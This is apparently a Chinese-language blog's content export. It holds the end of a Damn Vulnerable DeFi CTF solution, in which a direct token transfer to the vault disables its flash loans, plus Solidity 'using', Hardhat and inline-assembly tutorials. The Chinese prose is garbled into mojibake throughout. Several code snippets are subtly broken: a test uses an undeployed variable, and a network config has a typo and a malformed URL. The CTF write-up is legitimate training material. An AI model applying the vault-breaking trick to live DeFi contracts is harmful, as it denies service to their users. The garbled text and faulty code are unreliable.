è¡¨ç¤ºé‡‘åº“æœ€å¤§ä¾›ç»™é¢åº¦ï¼Œåªå—é“¸å¸å’Œé”€å¸çš„å½±å“ã€‚ æ‰€ä»¥ï¼Œåªè¦åœ¨åˆå§‹åŒ–çš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„ç¬¬ä¸€ç¬”äº¤æ˜“å°±æ˜¯ç»™æˆ‘ä»¬çš„å€Ÿè´·æ± è½¬å…¥ä»»æ„ä¸€ç¬”é’±ï¼Œæ­¤æ—¶ convertToShares(totalSupply) != balanceBeforeæ°¸è¿œä¸å¯èƒ½æˆç«‹ï¼Œå°±ä¸èƒ½ä»å€Ÿè´·æ± è´·æ¬¾äº†ã€‚ æ³¨æ„ convertToShares å‡½æ•° 12345function convertToShares(uint256 assets) public view virtual returns (uint256) &#123; uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero. return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());&#125; æ‰§è¡Œ convertToShares(totalSupply)çš„ç»“æœå°±æ˜¯ totalSupplyã€‚ 3. solvingjsæ–‡ä»¶ä¸­ï¼š 12345it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const attract = token.connect(player); await attract.transfer(vault.address, INITIAL_PLAYER_TOKEN_BALANCE);&#125;); æµ‹è¯•ï¼š é€šè¿‡ã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"using çš„ä½¿ç”¨","slug":"Basic_Knowledge/solidity/Usingçš„ä½¿ç”¨","date":"2023-07-08T14:47:10.000Z","updated":"2023-07-08T14:47:10.000Z","comments":true,"path":"2023/07/08/Basic_Knowledge/solidity/Usingçš„ä½¿ç”¨/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/08/Basic_Knowledge/solidity/Using%E7%9A%84%E4%BD%BF%E7%94%A8/","excerpt":"","text":"1.è¯­æ³•1using A for * // æ•ˆæœæ˜¯ï¼Œåº“Aä¸­çš„å‡½æ•°è¢«é™„ç€åœ¨åšä»»æ„çš„ç±»å‹ä¸Š æŒ‡ä»¤using A for B;ç”¨æ¥é™„ç€åº“é‡Œå®šä¹‰çš„å‡½æ•°(ä»åº“A)åˆ°ä»»æ„ç±»å‹Bã€‚è¿™äº›å‡½æ•°å°†ä¼šé»˜è®¤æ¥æ”¶è°ƒç”¨å‡½æ•°å¯¹è±¡çš„å®ä¾‹ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚ 2. ç¤ºä¾‹ä»£ç 2.1 Mathåº“åˆçº¦ï¼š123456789101112// å£°æ˜ä¸€ä¸ªåº“åˆçº¦library Math &#123; // å®šä¹‰ä¸€ä¸ªåŠ æ³•å‡½æ•° function add(Test1 test1, uint256 a, uint256 b) external pure returns (uint256) &#123; return a + b; &#125; // å®šä¹‰ä¸€ä¸ªä¹˜æ³•å‡½æ•° function mul(uint256 a, uint256 b) external pure returns (uint256) &#123; return a * b; &#125;&#125; 2.2 æµ‹è¯•åˆçº¦ï¼š12345678// æµ‹è¯•åˆçº¦contract Test1 &#123; address owner; function getOwner() external view returns(address) &#123; return owner; &#125;&#125; 2.3 å¼•ç”¨åº“åˆçº¦ï¼š123456789101112131415// åˆçº¦ä¸­ä½¿ç”¨åº“åˆçº¦contract Calculator&#123; using Math for Test1; // ä½¿ç”¨åº“åˆçº¦ä¸­çš„åŠ æ³•å‡½æ•° function add(address _test, uint256 a, uint256 b) external pure returns (uint256) &#123; return Test1(_test).add(a, b); &#125; // ä½¿ç”¨åº“åˆçº¦ä¸­çš„ä¹˜æ³•å‡½æ•° function mul(uint256 a, uint256 b) external pure returns (uint256) &#123; return Math.mul(a, b); &#125;&#125; 2.4 è§£è¯»å¼•ç”¨åº“åˆçº¦using Math for Test1ï¼šTest åˆçº¦éƒ½å…·æœ‰Mathåˆçº¦çš„åŠŸèƒ½ã€‚ Test1(_test).add(a, b)ï¼šä»åº“åˆçº¦å¯ä»¥çŸ¥é“ï¼Œaddå‡½æ•°çš„å½¢å‚ä¸º add(Test1 test1, uint256 a, uint256 b)ï¼Œåœ¨è¯¥å‡½æ•°ä¼šé»˜è®¤æŠŠè°ƒç”¨è€…ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå³ Test1åˆçº¦ã€‚ 3. æµ‹è¯•3.1 éƒ¨ç½² Test1, Calculator 3.2 ä½¿ç”¨Test1çš„åœ°å€è°ƒç”¨addå‡½æ•° æˆåŠŸè°ƒç”¨","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"using","slug":"using","permalink":"https://biyouqiuqiu.com/tags/using/"}]},{"title":"hardhat_using","slug":"Utils/Hardhat/hardhat_self","date":"2023-07-04T05:47:10.000Z","updated":"2023-07-04T05:47:10.000Z","comments":true,"path":"2023/07/04/Utils/Hardhat/hardhat_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/04/Utils/Hardhat/hardhat_self/","excerpt":"","text":"å®˜æ–¹æ–‡æ¡£ ä¸­æ–‡æ–‡æ¡£1. åŸºæœ¬æŒ‡ä»¤(ç¼–è¯‘ã€æµ‹è¯•ã€éƒ¨ç½²)1.1 æ‰§è¡Œ npx hardhatæŠ¥é”™ åŸå› ï¼š ç¼ºå°‘â€@nomicfoundation/hardhat-toolboxâ€œHardhatæ’ä»¶ã€‚ è§£å†³æ–¹æ¡ˆï¼š 1npm install --save-dev @nomicfoundation/hardhat-toolbox å¦‚æœæŠ¥ä»¥ä¸‹é”™è¯¯ï¼Œåˆ™å†æ‰§è¡Œä¸€é npm install --save-dev @nomicfoundation/hardhat-toolboxå³å¯ 1.2 ç¼–è¯‘åˆçº¦1npx hardhat compile 1.3 è¿è¡Œæµ‹è¯•1npx hardhat test test/Lock.js å¦‚æœå› ä¸ºä¹‹å‰åœ¨å¯¹åˆçº¦çš„åˆ›å»ºçš„æ—¶å€™ï¼Œæ–‡ä»¶åå’Œåˆçº¦åä¸ä¸€æ ·ï¼Œé‡å‘½åä¼šå‡ºç°testæŠ¥é”™çš„æƒ…å†µï¼Œè§£å†³æ–¹æ³•å°±æ˜¯ï¼Œå°†å½“å‰å·¥ä½œç›®å½•ä¸‹ç¼–è¯‘ç”Ÿæˆçš„artifactså’Œcacheæ–‡ä»¶åˆ é™¤ï¼Œå†æ‰§è¡Œnpx hardhat compileï¼Œé‡æ–°ç¼–è¯‘ã€‚ 1.4 è¿è¡Œjsæ–‡ä»¶(éƒ¨ç½²åˆçº¦)1npx hardhat run scripts/deploy.js 1.5 å°†é’±åŒ…æˆ–dappè¿æ¥åˆ°hardhatç½‘ç»œ1npx hardhat node 1npx hardhat run scripts/deploy.js --network localhost æ³¨ï¼šéœ€è¦å°†æœ¬åœ°ç½‘ç»œå¯åŠ¨ï¼Œå³éœ€è¦å¼€å¯ä¸¤ä¸ªç»ˆç«¯ï¼Œä¸€ä¸ªç”¨äºæŒ‚è½½ç½‘ç»œï¼Œä¸€ä¸ªç”¨äºæµ‹è¯• 2. åˆ›å»ºä¸€ä¸ªåŸºæœ¬çš„é¡¹ç›®2.1 åˆ›å»ºå‘½ä»¤åœ¨ä½ è¦åˆ›å»ºé¡¹ç›®çš„æ–‡ä»¶å¤¹ï¼ˆç©ºæ–‡ä»¶å¤¹ï¼‰ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1npx hardhat åˆå§‹åŒ–çš„é¡¹ç›®ç»“æ„å¦‚ä¸‹ï¼š 1234contracts/scripts/test/hardhat.config.js contracts/æ˜¯åˆåŒæºæ–‡ä»¶æ‰€åœ¨çš„ä½ç½®ã€‚ test/æ˜¯ä½ çš„æµ‹è¯•åº”è¯¥å»çš„åœ°æ–¹ã€‚ scripts/è¿™æ˜¯ç®€å•çš„è‡ªåŠ¨åŒ–è„šæœ¬æ‰€åœ¨çš„ä½ç½®ã€‚ 3. å¯¹åˆçº¦è¿›è¡Œæµ‹è¯•3.1 è¯­æ³•æ ¼å¼123456const &#123; ethers &#125; = require(&quot;hardhat&quot;);describe(&quot;&quot;/* è‡ªå®šä¹‰æœ¬æ¬¡æµ‹è¯•å */,function()&#123; it(&quot;&quot;/* è‡ªå®šä¹‰dan&#x27;yuanæµ‹è¯•å */, async function () &#123; /* your code*/ &#125;);&#125;); 3.2 æµ‹è¯•åˆçº¦ï¼ˆæ— å‚æ„é€ å™¨ï¼‰ MyContract1.solï¼š 123456789101112131415161718// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.0;import &quot;hardhat/console.sol&quot;;contract MyContract1 &#123; address owner; constructor() &#123; owner = msg.sender; &#125; function getOwner() external view returns(address) &#123; console.log(unicode&quot;è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•åˆçº¦ï¼&quot;); return owner; &#125;&#125; è§£è¯»ï¼š import &quot;hardhat/console.sol&quot;ï¼šå…¶ä½œç”¨æ˜¯ä»hardhatæ–‡ä»¶å¤¹ä¸‹å¼•å…¥console.solåˆçº¦ ï¼ˆä½†æ˜¯æˆ‘ç¿»äº†ä¸ªéï¼Œåœ¨æœ¬åœ°éƒ½æ‰¾ä¸åˆ°è¿™ä¸ªåˆçº¦ï¼‰; console.log()ï¼šå…¶ä½œç”¨æ˜¯åœ¨æ§åˆ¶å°æ‰“å°è¾“å‡ºè‡ªå®šä¹‰ç»“æœï¼› unicode&quot;è¿™æ˜¯ä¸€ä¸ªæµ‹è¯•åˆçº¦ï¼&quot;ï¼šå…¶ä½œç”¨æ˜¯ä¸ºäº†è¾“å‡ºä¸­æ–‡ï¼ˆsolidityä¸­ä¸æ”¯æŒç›´æ¥è¾“å‡ºä¸­æ–‡ï¼‰åœ¨æ±‰å­—å­—ç¬¦ä¸²å‰åŠ ä¸Šunicodeã€‚ MyContract1.jsï¼š 1234567891011121314const &#123; ethers &#125; = require(&quot;hardhat&quot;); describe(&quot;MyContract&quot;, function () &#123; it(&quot;Here is demo&quot;, async function () &#123; const myContract = await ethers.getContractFactory(&quot;MyContract1&quot;); // const con = await myContract.deploy(); const owner = await con.getOwner(); console.log(&quot;MyContract çš„æ‹¥æœ‰è€…æ˜¯ &quot; + owner); &#125;); &#125;); è§£è¯»ï¼š describe(&quot;MyContract&quot;, function ()&#123;&#125;): åˆ›å»ºæµ‹è¯•å¥—ä»¶ï¼Œåç§°ä¸º â€œMyContractâ€; it(&quot;Here is demo&quot;, async function () &#123;&#125; ï¼šåˆ›å»ºæµ‹è¯•ç”¨ä¾‹ï¼Œåç§°ä¸º â€œHere is demoâ€(å¯ä»¥åœ¨ä¸€ä¸ªdescribeä¸­åˆ›å»ºå¤šä¸ªit)ï¼› const myContract = await ethers.getContractFactory(&quot;MyContract1&quot;)ï¼š è·å– â€œMyContract1â€ æ™ºèƒ½åˆçº¦çš„å·¥å‚å¯¹è±¡ï¼› const con = await myContract.deploy()ï¼š éƒ¨ç½² â€œMyContract1â€ æ™ºèƒ½åˆçº¦ï¼› const owner = await con.getOwner()ï¼š è°ƒç”¨æ™ºèƒ½åˆçº¦ä¸­çš„ getOwner() æ–¹æ³•è·å–åˆçº¦çš„æ‹¥æœ‰è€…ã€‚ 3.3 æµ‹è¯•åˆçº¦ï¼ˆæœ‰å‚æ„é€ å™¨ï¼‰ MyContract2.solï¼š 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.9;import &quot;hardhat/console.sol&quot;;contract MyContract2 &#123; address owner; string name; constructor(string memory _name) &#123; owner = msg.sender; name = _name; &#125; function getOwner() external view returns(address) &#123; return owner; &#125; function print() external view &#123; console.log(unicode&quot;è¿™æ˜¯MyContract1åˆçº¦&quot;); &#125; function setName(string memory _name) external &#123; name = _name; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; MyContract2.jsï¼š 1234567891011121314151617181920212223242526272829303132const &#123; ethers &#125; = require(&quot;hardhat&quot;);// const &#123; ethers &#125; = require(&quot;ethers&quot;);describe(&quot;MyContract2&quot;, async function () &#123; it(&quot;To test ethers.provider.getStorageAt()&quot;, async function()&#123; const MyContract2 = await ethers.getContractFactory(&quot;MyContract2&quot;); // console.log(MyContract1); const contract = await MyContract2.deploy(&quot;libiyou&quot;); console.log(contract); const owner = await contract.getOwner(); console.log(`owner =&gt; $&#123;owner&#125;`); const name1 = await contract.getName(); console.log(`name1 =&gt; $&#123;name1&#125;`); await contract.setName(&quot;biyou&quot;); const name2 = await contract.getName(); console.log(`name2 =&gt; $&#123;name2&#125;`); await contract.print(); // const salt0 = await ethers.provider.getStorage(&quot;0x5FbDB2315678afecb367f032d93F642f64180aa3&quot;,0); // console.log(salt0); &#125;)&#125;) 4. å°†åˆçº¦éƒ¨ç½²åˆ°æœ¬åœ°å¼€å‘èŠ‚ç‚¹4.1 è¯­æ³•æ ¼å¼å¯åŠ¨æœ¬åœ°èŠ‚ç‚¹å‘½ä»¤ï¼š 1npx hardhat node npxå‘½ä»¤ï¼š 1npx hardhat run scripts/deploy_MyContract2.js --network localhost jsä»£ç ï¼š 123456789101112const hre = require(&quot;hardhat&quot;);async function main() &#123; const toDeployContract = &quot;&quot;; // è¦éƒ¨ç½²çš„åˆçº¦å const contract = await hre.ethers.deployContract(toDeployContract,[params...]/* æ„é€ å™¨çš„å½¢å‚ä¸ªæ•° */,&#123; value: // ç»™åˆçº¦æ³¨å…¥çš„é‡‘é¢ &#125;);&#125;main().catch((error) =&gt; &#123; console.error(error);&#125;) 4.2 éƒ¨ç½²åˆçº¦ ï¼ˆæ— å‚æ„é€ å™¨ï¼‰MyContract1.solï¼š 1234567891011121314151617181920212223242526272829// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.9;import &quot;hardhat/console.sol&quot;;contract MyContract1 &#123; address owner; string name; constructor() &#123; owner = msg.sender; &#125; function getOwner() external view returns(address) &#123; return owner; &#125; function print() external view &#123; console.log(unicode&quot;è¿™æ˜¯MyContract1åˆçº¦&quot;); &#125; function setName(string memory _name) external &#123; name = _name; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; deploy_MyContract1.jsï¼š 12345678910111213141516171819const hre = require(&quot;hardhat&quot;);async function main() &#123; const contract = await hre.ethers.deployContract(&quot;MyContract1&quot;); // console.log(contract); await contract.waitForDeployment(); console.log(await contract.getAddress()); await contract.setName(&quot;biyou&quot;); let name1 = await contract.getName(); console.log(name1); contract.print();&#125;main().catch((error) =&gt; &#123; console.error(error);&#125;) è¿è¡Œç»“æœï¼š 4.3 éƒ¨ç½²åˆçº¦ ï¼ˆæœ‰å‚æ„é€ å™¨ï¼‰MyContract2.solï¼š 123456789101112131415161718192021222324252627282930// SPDX-License-Identifier: UNLICENSEDpragma solidity ^0.8.9;import &quot;hardhat/console.sol&quot;;contract MyContract2 &#123; address owner; string name; constructor(string memory _name) &#123; owner = msg.sender; name = _name; &#125; function getOwner() external view returns(address) &#123; return owner; &#125; function print() external view &#123; console.log(unicode&quot;è¿™æ˜¯MyContract1åˆçº¦&quot;); &#125; function setName(string memory _name) external &#123; name = _name; &#125; function getName() external view returns(string memory) &#123; return name; &#125;&#125; deploy_MyContract2.jsï¼š 12345678910111213141516171819202122232425const hre = require(&quot;hardhat&quot;);const &#123; ethers &#125; = require(&quot;hardhat&quot;);async function main() &#123; // [&quot;lby&quot;] è¡¨ç¤ºå¾€æ„é€ å™¨ä¸­ä¼ å…¥å‚æ•° const contract = await hre.ethers.deployContract(&quot;MyContract2&quot;,[&quot;lby&quot;]); const address = await contract.getAddress(); console.log(address); let slot0 = await ethers.provider.getStorage(address, 0); let slot1 = await ethers.provider.getStorage(address, 1); console.log(`slot0 =&gt; $&#123;slot0&#125;\\nslot1 =&gt; $&#123;slot1&#125;`); await contract.setName(&quot;biyou&quot;); let name = await contract.getName(); console.log(`name =&gt; $&#123;name&#125;`); slot0 = await ethers.provider.getStorage(address, 0); slot1 = await ethers.provider.getStorage(address, 1); console.log(`slot0 =&gt; $&#123;slot0&#125;\\nslot1 =&gt; $&#123;slot1&#125;`);&#125;main().catch((error)=&gt;&#123; console.log(error);&#125;) è¿è¡Œç»“æœï¼š 5. å°†åˆçº¦éƒ¨ç½²åˆ°æµ‹è¯•ç½‘ç»œè¿™é‡Œä»¥polygonä¸ºä¾‹ polygon fauceté“¾æ¥ polygonscané“¾æ¥ è§†é¢‘æ•™å­¦ 5.1 å…ˆå¯åŠ¨ hardhatæœ¬åœ°å¼€å‘èŠ‚ç‚¹å‘½ä»¤ï¼š 1npx hardhat node 5.2 ç¼–å†™é…ç½®æ–‡ä»¶*hardhat.config.js*ï¼š 123456789101112networks: &#123; localhoat: &#123; url: &quot;http://127.0.0.1:8545&quot;, chainId: 31337, accounts: [process.env.PRIVATE_KEY] &#125;, polygon: &#123; url: &quot;&#x27;https://matic-mumbai.chainstacklabs.com&quot;, chainId: 80001, accounts: [POLYGON_PRIVATE_KEY] &#125; &#125; 5.3 å°†æœ¬åœ°èŠ‚ç‚¹å¯¼å…¥å°ç‹ç‹¸é’±åŒ… 5.4 åˆ° polygon æ°´é¾™å¤´é¢†å–æµ‹è¯•å¸ 5.å°†åˆçº¦éƒ¨ç½²åˆ°polygonæµ‹è¯•ç½‘æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ 1npx hardhat run scripts/deploy_MyContract2.js --network polygon","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"hardhat","slug":"Utils/hardhat","permalink":"https://biyouqiuqiu.com/categories/Utils/hardhat/"}],"tags":[{"name":"hardhat","slug":"hardhat","permalink":"https://biyouqiuqiu.com/tags/hardhat/"}]},{"title":"å†…è”æ±‡ç¼–","slug":"Basic_Knowledge/solidity/å†…è”æ±‡ç¼–","date":"2023-07-01T00:47:10.000Z","updated":"2023-07-01T00:47:10.000Z","comments":true,"path":"2023/07/01/Basic_Knowledge/solidity/å†…è”æ±‡ç¼–/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/01/Basic_Knowledge/solidity/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/","excerpt":"","text":"å®˜æ–¹æ–‡æ¡£âœˆæ³¨ï¼šsolidityå†…è”æ±‡ç¼–ä¸­éƒ½æ˜¯ä»¥å­—èŠ‚ä¸ºå•ä½çš„ï¼Œ[0x00,0x20)è¡¨ç¤ºçš„èŒƒå›´æ˜¯2^32-1,ä½†åœ¨è®¡ç®—æœºä¸­å äº†256ä½ï¼Œ256 &#x2F;8&#x3D;32&#x3D;0x20 1. è¯­æ³•å’Œ solidityä¸€æ ·ï¼ŒAssembly ä¹Ÿä¼šè§£ææ³¨é‡Šã€æ–‡å­—å’Œæ ‡è¯†ç¬¦ï¼Œæ‰€ä»¥ä½ å¯ä»¥ä½¿ç”¨é€šå¸¸çš„ // å’Œ /* */ æ¥è¿›è¡Œæ³¨é‡Šã€‚ å†…è”æ±‡ç¼–ç¨‹åºç”± assembly &#123; ... &#125; æ¥æ ‡è®°ï¼Œåœ¨è¿™äº›å¤§æ‹¬å·å†…å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å†…å®¹ã€‚ å­—é¢å¸¸æ•°ï¼Œä¹Ÿå°±æ˜¯ 0x123ã€42 æˆ– &quot;abc&quot; ï¼ˆä¸è¶…è¿‡ 32 ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼‰ æ“ä½œç ï¼ˆåœ¨â€œinstruction styleâ€å†…ï¼‰ï¼Œæ¯”å¦‚ mload sload dup1 sstoreï¼Œæ“ä½œç åˆ—è¡¨è¯·çœ‹åé¢ å‡½æ•°é£æ ¼æ“ä½œç ï¼Œæ¯”å¦‚ add(1ï¼Œmlod(0)) æ ‡ç­¾ï¼Œæ¯”å¦‚ name: å˜é‡å£°æ˜ï¼Œæ¯”å¦‚ let x := 7ã€let x := add(y, 3) æˆ–è€… let x ï¼ˆåˆå§‹å€¼å°†è¢«ç½®ä¸º empty(0)ï¼‰ æ ‡è¯†ç¬¦ï¼ˆæ ‡ç­¾æˆ–è€…æ±‡ç¼–å±€éƒ¨å˜é‡ä»¥åŠç”¨ä½œå†…è”æ±‡ç¼–æ—¶çš„å¤–éƒ¨å˜é‡ï¼‰ï¼Œæ¯”å¦‚ jump(name)ã€3 x add èµ‹å€¼ï¼ˆåœ¨â€œinstruction styleâ€å†…ï¼‰ï¼Œæ¯”å¦‚ 3 =: x å‡½æ•°é£æ ¼èµ‹å€¼ï¼Œæ¯”å¦‚ x := add(yï¼Œ3) ä¸€äº›æ§åˆ¶å±€éƒ¨å˜é‡ä½œç”¨åŸŸçš„è¯­å¥å—ï¼Œæ¯”å¦‚ &#123;let x := 3 &#123; let y := add(xï¼Œ1) &#125;&#125; 2. å¸¸ç”¨æ“ä½œç æ³¨ï¼šåœ¨ä¸‹è¡¨ä¸­ï¼Œmem[a...b) è¡¨ç¤ºä»ä½ç½® a å¼€å§‹è‡³ï¼ˆä¸åŒ…æ‹¬ï¼‰ä½ç½® b çš„å†…å­˜å­—èŠ‚æ•°ï¼Œstorage[p] è¡¨ç¤ºä½ç½® p å¤„çš„å­˜å‚¨å†…å®¹ã€‚ Instruction Explanation stop - F åœæ­¢æ‰§è¡Œï¼Œä¸ return(0,0) ç­‰ä»· add(x, y) F x + y sub(x, y) F x - y mul(x, y) F x * y div(x, y) F x &#x2F; y sdiv(x, y) F x &#x2F; yï¼Œä»¥äºŒè¿›åˆ¶è¡¥ç ä½œä¸ºç¬¦å· mod(x, y) F x % y smod(x, y) F x % yï¼Œä»¥äºŒè¿›åˆ¶è¡¥ç ä½œä¸ºç¬¦å· exp(x, y) F x çš„ y æ¬¡å¹‚ not(x) F ~xï¼Œå¯¹ x æŒ‰ä½å–å lt(x, y) F å¦‚æœ x &lt; y ä¸º 1ï¼Œå¦åˆ™ä¸º 0 gt(x, y) F å¦‚æœ x &gt; y ä¸º 1ï¼Œå¦åˆ™ä¸º 0 slt(x, y) F å¦‚æœ x &lt; y ä¸º 1ï¼Œå¦åˆ™ä¸º 0ï¼Œä»¥äºŒè¿›åˆ¶è¡¥ç ä½œä¸ºç¬¦å· sgt(x, y) F å¦‚æœ x &gt; y ä¸º 1ï¼Œå¦åˆ™ä¸º 0ï¼Œä»¥äºŒè¿›åˆ¶è¡¥ç ä½œä¸ºç¬¦å· eq(x, y) F å¦‚æœ x &#x3D;&#x3D; y ä¸º 1ï¼Œå¦åˆ™ä¸º 0 iszero(x) F å¦‚æœ x &#x3D;&#x3D; 0 ä¸º 1ï¼Œå¦åˆ™ä¸º 0 and(x, y) F x å’Œ y çš„æŒ‰ä½ä¸ or(x, y) F x å’Œ y çš„æŒ‰ä½æˆ– xor(x, y) F x å’Œ y çš„æŒ‰ä½å¼‚æˆ– byte(n, x) F x çš„ç¬¬ n ä¸ªå­—èŠ‚ï¼Œè¿™ä¸ªç´¢å¼•æ˜¯ä» 0 å¼€å§‹çš„ shl(x, y) C å°† y é€»è¾‘å·¦ç§» x ä½ shr(x, y) C å°† y é€»è¾‘å³ç§» x ä½ sar(x, y) C å°† y ç®—æœ¯å³ç§» x ä½ addmod(x, y, m) F ä»»æ„ç²¾åº¦çš„ (x + y) % m mulmod(x, y, m) F ä»»æ„ç²¾åº¦çš„ (x * y) % m signextend(i, x) F å¯¹ x çš„æœ€ä½ä½åˆ°ç¬¬ (i * 8 + 7) è¿›è¡Œç¬¦å·æ‰©å±• keccak256(p, n) F keccak(mem[pâ€¦(p + n))) jump(label) - F è·³è½¬åˆ°æ ‡ç­¾ &#x2F; ä»£ç ä½ç½® jumpi(label, cond) - F å¦‚æœæ¡ä»¶ä¸ºéé›¶ï¼Œè·³è½¬åˆ°æ ‡ç­¾ pc F å½“å‰ä»£ç ä½ç½® pop(x) - F åˆ é™¤ï¼ˆå¼¹å‡ºï¼‰æ ˆé¡¶çš„ x ä¸ªå…ƒç´  dup1 â€¦ dup16 F å°†æ ˆå†…ç¬¬ i ä¸ªå…ƒç´ ï¼ˆä»æ ˆé¡¶ç®—èµ·ï¼‰å¤åˆ¶åˆ°æ ˆé¡¶ swap1 â€¦ swap16 * F å°†æ ˆé¡¶å…ƒç´ å’Œå…¶ä¸‹ç¬¬ i ä¸ªå…ƒç´ äº’æ¢ mload(p) F mem[pâ€¦(p + 32)) mstore(p, v) - F mem[pâ€¦(p + 32)) :&#x3D; v mstore8(p, v) - F mem[p] :&#x3D; v &amp; 0xff ï¼ˆä»…ä¿®æ”¹ä¸€ä¸ªå­—èŠ‚ï¼‰ sload(p) F storage[p] sstore(p, v) - F storage[p] :&#x3D; v msize F å†…å­˜å¤§å°ï¼Œå³æœ€å¤§å¯è®¿é—®å†…å­˜ç´¢å¼• gas F æ‰§è¡Œå¯ç”¨çš„ gas address F å½“å‰åˆçº¦ &#x2F; æ‰§è¡Œä¸Šä¸‹æ–‡çš„åœ°å€ balance(a) F åœ°å€ a çš„ä½™é¢ï¼Œä»¥ wei ä¸ºå•ä½ caller F è°ƒç”¨å‘èµ·è€…ï¼ˆä¸åŒ…æ‹¬ delegatecallï¼‰ callvalue F éšè°ƒç”¨å‘é€çš„ Wei çš„æ•°é‡ calldataload(p) F ä½ç½® p çš„è°ƒç”¨æ•°æ®ï¼ˆ32 å­—èŠ‚ï¼‰ calldatasize F è°ƒç”¨æ•°æ®çš„å­—èŠ‚æ•°å¤§å° calldatacopy(t, f, s) - F ä»è°ƒç”¨æ•°æ®çš„ä½ç½® f çš„æ‹·è´ s ä¸ªå­—èŠ‚åˆ°å†…å­˜çš„ä½ç½® t codesize F å½“å‰åˆçº¦ &#x2F; æ‰§è¡Œä¸Šä¸‹æ–‡åœ°å€çš„ä»£ç å¤§å° codecopy(t, f, s) - F ä»ä»£ç çš„ä½ç½® f å¼€å§‹æ‹·è´ s ä¸ªå­—èŠ‚åˆ°å†…å­˜çš„ä½ç½® t extcodesize(a) F åœ°å€ a çš„ä»£ç å¤§å° extcodecopy(a, t, f, s) - F å’Œ codecopy(t, f, s) ç±»ä¼¼ï¼Œä½†ä»åœ°å€ a è·å–ä»£ç  returndatasize B æœ€åä¸€ä¸ª returndata çš„å¤§å° returndatacopy(t, f, s) - B ä» returndata çš„ä½ç½® f æ‹·è´ s ä¸ªå­—èŠ‚åˆ°å†…å­˜çš„ä½ç½® t create(v, p, s) F ç”¨ mem[pâ€¦(p + s)) ä¸­çš„ä»£ç åˆ›å»ºä¸€ä¸ªæ–°åˆçº¦ã€å‘é€ v wei å¹¶è¿”å› æ–°åœ°å€ create2(v, n, p, s) C ç”¨ mem[pâ€¦(p + s)) ä¸­çš„ä»£ç ï¼Œåœ¨åœ°å€ keccak256( . n . keccak256(mem[pâ€¦(p + s))) ä¸Š åˆ›å»ºæ–°åˆçº¦ã€å‘é€ v wei å¹¶è¿”å›æ–°åœ°å€ call(g, a, v, in, insize, out, outsize) F ä½¿ç”¨ mem[inâ€¦(in + insize)) ä½œä¸ºè¾“å…¥æ•°æ®ï¼Œ æä¾› g gas å’Œ v wei å¯¹åœ°å€ a å‘èµ·æ¶ˆæ¯è°ƒç”¨ï¼Œ è¾“å‡ºç»“æœæ•°æ®ä¿å­˜åœ¨ mem[outâ€¦(out + outsize))ï¼Œ å‘ç”Ÿé”™è¯¯ï¼ˆæ¯”å¦‚ gas ä¸è¶³ï¼‰æ—¶è¿”å› 0ï¼Œæ­£ç¡®ç»“æŸè¿”å› 1 callcode(g, a, v, in, insize, out, outsize) F ä¸ call ç­‰ä»·ï¼Œä½†ä»…ä½¿ç”¨åœ°å€ a ä¸­çš„ä»£ç  ä¸”ä¿æŒå½“å‰åˆçº¦çš„æ‰§è¡Œä¸Šä¸‹æ–‡ delegatecall(g, a, in, insize, out, outsize) F ä¸ callcode ç­‰ä»·ä¸”ä¿ç•™ caller å’Œ callvalue staticcall(g, a, in, insize, out, outsize) F ä¸ call(g, a, 0, in, insize, out, outsize) ç­‰ä»· ä½†ä¸å…è®¸çŠ¶æ€ä¿®æ”¹ return(p, s) - F ç»ˆæ­¢è¿è¡Œï¼Œè¿”å› mem[pâ€¦(p + s)) çš„æ•°æ® revert(p, s) - B ç»ˆæ­¢è¿è¡Œï¼Œæ’¤é”€çŠ¶æ€å˜åŒ–ï¼Œè¿”å› mem[pâ€¦(p + s)) çš„æ•°æ® selfdestruct(a) - F ç»ˆæ­¢è¿è¡Œï¼Œé”€æ¯å½“å‰åˆçº¦å¹¶ä¸”æŠŠèµ„é‡‘å‘é€åˆ°åœ°å€ a invalid - F ä»¥æ— æ•ˆæŒ‡ä»¤ç»ˆæ­¢è¿è¡Œ log0(p, s) - F ä»¥ mem[pâ€¦(p + s)) çš„æ•°æ®äº§ç”Ÿä¸å¸¦ topic çš„æ—¥å¿— log1(p, s, t1) - F ä»¥ mem[pâ€¦(p + s)) çš„æ•°æ®å’Œ topic t1 äº§ç”Ÿæ—¥å¿— log2(p, s, t1, t2) - F ä»¥ mem[pâ€¦(p + s)) çš„æ•°æ®å’Œ topic t1ã€t2 äº§ç”Ÿæ—¥å¿— log3(p, s, t1, t2, t3) - F ä»¥ mem[pâ€¦(p + s)) çš„æ•°æ®å’Œ topic t1ã€t2ã€t3 äº§ç”Ÿæ—¥å¿— log4(p, s, t1, t2, t3, 